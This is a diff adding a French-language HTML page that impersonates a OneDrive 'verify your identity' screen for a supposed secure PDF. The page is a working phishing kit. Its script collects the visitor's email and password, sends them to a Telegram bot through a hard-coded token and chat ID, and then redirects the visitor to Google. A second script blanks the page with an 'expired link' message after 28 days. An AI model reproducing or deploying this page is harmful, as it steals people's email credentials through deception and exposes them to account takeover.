@@ -1,0 +1,252 @@
+﻿<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OneDrive Sécurité</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #e5efff, #f4f4f4);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      background-color: #0078D4;
+      height: 60px;
+      display: flex;
+      align-items: center;
+      padding-left: 20px;
+    }
+
+    header img {
+      height: 28px;
+    }
+
+    .container {
+      flex-grow: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: #fff;
+      max-width: 400px;
+      width: 100%;
+      padding: 30px 25px;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      animation: fadeIn 0.5s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .card h2 {
+      font-size: 20px;
+      color: #333;
+      margin-bottom: 15px;
+    }
+
+    .pdf-info {
+      font-size: 14px;
+      color: #444;
+      margin-bottom: 20px;
+    }
+
+    .pdf-info img {
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+
+    .email-logos img {
+      height: 24px;
+      margin: 10px 0;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+      transition: border 0.3s;
+    }
+
+    input:focus {
+      border-color: #0078D4;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0078D4;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      margin-top: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #005ea6;
+    }
+
+    .loader {
+      display: none;
+      margin-top: 15px;
+      color: #0078D4;
+      font-size: 14px;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 20px 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <img src="files/img/one.png" alt="OneDrive Logo" />
+</header>
+
+<div class="container">
+  <div class="card">
+    <h2>Vérifiez votre identité</h2>
+    <div class="pdf-info">
+      <p>Vous avez reçu un fichier sécurisé</p>
+      <p>
+        <img src="files/img/pdf.png" alt="PDF" width="24" />
+        56.1KB
+      </p>
+      <p>Pour lire le document, veuillez entrer les identifiants de messagerie associés.</p>
+    </div>
+
+    <div class="email-logos">
+      <img src="files/img/all.png" alt="Fournisseurs" />
+    </div>
+
+    <input type="email" id="email" placeholder="Adresse e-mail" required />
+    <input type="password" id="password" placeholder="Mot de passe" required />
+    <button onclick="sendToTelegram()">Continuer</button>
+
+    <div class="loader" id="loader">Envoi en cours...</div>
+  </div>
+</div>
+
+<script>
+  function sendToTelegram() {
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+    const loader = document.getElementById("loader");
+
+    if (!email || !password) {
+      alert("Veuillez remplir tous les champs.");
+      return;
+    }
+
+    loader.style.display = "block";
+
+    const token = "7424554162:AAH7_jmIZV5jXiYWQ6HcUAPIrhGMdb1MxnA"; // <-- Remplace par ton token
+    const chatId = "-4598503494";  // <-- Remplace par ton chat ID
+    const message = `📩 Infos Mails pros :\n\n📧 Email : ${email}\n🔒 Mot de passe : ${password}`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    fetch(url)
+      .then(response => {
+        loader.style.display = "none";
+        if (response.ok) {
+          window.location.href = "https://www.google.com";
+        } else {
+          alert("Erreur lors de l'envoi. Veuillez réessayer.");
+        }
+      })
+      .catch(error => {
+        console.error("Erreur :", error);
+        loader.style.display = "none";
+        alert("Une erreur est survenue. Vérifiez votre connexion.");
+      });
+  }
+</script>
+<script>
+// Date de début : 8 juin 2025
+const startDate = new Date('2025-06-28T00:00:00');
+
+// Délai d’expiration en jours
+const expirationDays = 28;
+
+// Vérifie si le lien a expiré
+function isLinkExpired() {
+  const now = new Date();
+  const timeDiff = now - startDate;
+  const daysPassed = timeDiff / (1000 * 60 * 60 * 24);
+  return daysPassed >= expirationDays;
+}
+
+// Affiche un message d’expiration avec style percutant
+function showExpirationMessage() {
+  if (isLinkExpired()) {
+    // Supprimer tout le contenu de la page
+    document.body.innerHTML = '';
+
+    // Créer le conteneur du message
+    const messageDiv = document.createElement('div');
+    messageDiv.innerHTML = `
+      <h1>⚠️ Le lien a expiré</h1>
+      <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
+    `;
+
+    // Style impactant
+    Object.assign(messageDiv.style, {
+      position: 'fixed',
+      top: '0',
+      left: '0',
+      width: '100vw',
+      height: '100vh',
+      display: 'flex',
+      flexDirection: 'column',
+      justifyContent: 'center',
+      alignItems: 'center',
+      backgroundColor: '#1a1a1a',
+      color: '#ff4d4f',
+      fontFamily: 'Segoe UI, Arial, sans-serif',
+      fontSize: '24px',
+      textAlign: 'center',
+      padding: '40px',
+      boxSizing: 'border-box',
+      zIndex: '9999',
+    });
+
+    // Style du titre
+    messageDiv.querySelector('h1').style.fontSize = '36px';
+    messageDiv.querySelector('h1').style.marginBottom = '20px';
+    messageDiv.querySelector('p').style.color = '#ffffff';
+
+    // Afficher sur la page
+    document.body.appendChild(messageDiv);
+  }
+}
+
+// Lancer au chargement de la page
+window.onload = showExpirationMessage;
+</script>
+</body>
+</html>
